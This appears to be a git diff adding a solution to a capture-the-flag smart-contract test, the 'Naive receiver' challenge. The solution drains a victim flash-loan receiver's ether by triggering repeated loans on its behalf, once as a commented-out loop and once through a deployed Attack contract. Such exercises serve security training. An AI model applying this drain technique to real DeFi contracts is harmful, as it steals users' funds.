@@ -30,7 +30,21 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+        // Naive way:
+        // for (let i =0; i < 10; i ++) {
+        //     await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('1'))
+        // }
+        // expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ethers.utils.parseEther('0'));
+
+        // Pro way:
+        const AttackContract = await ethers.getContractFactory('Attack', attacker);
+        this.attack = await AttackContract.deploy(this.pool.address, attacker.address);
+
+        await expect(this.attack.connect(user).CallFlashLoan(this.receiver.address)).to.be.reverted;
+
+        await this.attack.CallFlashLoan(this.receiver.address);
+        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ethers.utils.parseEther('0'));
     });
 
     after(async function () {
